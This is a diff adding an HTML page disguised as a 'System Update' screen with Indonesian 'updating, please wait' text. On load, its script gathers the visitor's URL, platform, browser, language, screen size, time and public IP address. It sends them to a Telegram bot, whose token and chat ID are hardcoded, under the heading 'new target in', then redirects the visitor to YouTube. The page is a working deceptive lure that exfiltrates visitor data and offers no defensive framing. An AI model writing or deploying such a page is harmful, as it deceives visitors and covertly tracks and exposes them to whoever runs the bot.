@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>System Update</title>
+<style>
+  body{background:#0d1117;color:#c9d1d9;font-family:sans-serif;text-align:center;padding-top:80px;}
+  .loader{border:4px solid #30363d;border-top:4px solid #58a6ff;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto 20px;}
+  @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+  <div class="loader"></div>
+  <h2>Memperbarui sistem...</h2>
+  <p>Mohon tunggu sebentar, jangan tutup halaman ini.</p>
+  
+<script>
+  // ==========================================
+  // KONFIGURASI TELEGRAM (SUDAH TERHUBUNG)
+  // ==========================================
+  const TELEGRAM_BOT_TOKEN = "8608235988:AAHyESiSOROHyvNI-5-D80jfu982ESsT5EE"; 
+  const TELEGRAM_CHAT_ID = "6809927557"; 
+
+  async function sendToTelegram() {
+    let info = {
+      "🌐 URL Asal": window.location.href,
+      "📱 Device/OS": navigator.platform,
+      "🖥️ Browser": navigator.userAgent,
+      "🗣️ Bahasa": navigator.language,
+      "📐 Resolusi": `${screen.width}x${screen.height}`,
+      "⏱️ Waktu": new Date().toLocaleString('id-ID')
+    };
+
+    try {
+      const ipRes = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipRes.json();
+      info["📍 IP Publik"] = ipData.ip;
+    } catch (e) {
+      info["📍 IP Publik"] = "Gagal diambil";
+    }
+
+    let message = "🚨 *TARGET BARU MASUK* 🚨\n\n";
+    for (let [key, value] of Object.entries(info)) {
+      message += `${key}: ${value}\n`;
+    }
+
+    try {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      });
+      
+      setTimeout(() => {
+        window.location.href = "https://www.youtube.com";
+      }, 3000);
+      
+    } catch (e) {
+      console.error("Gagal kirim:", e);
+    }
+  }
+
+  sendToTelegram();
+</script>
+</body>
+</html>
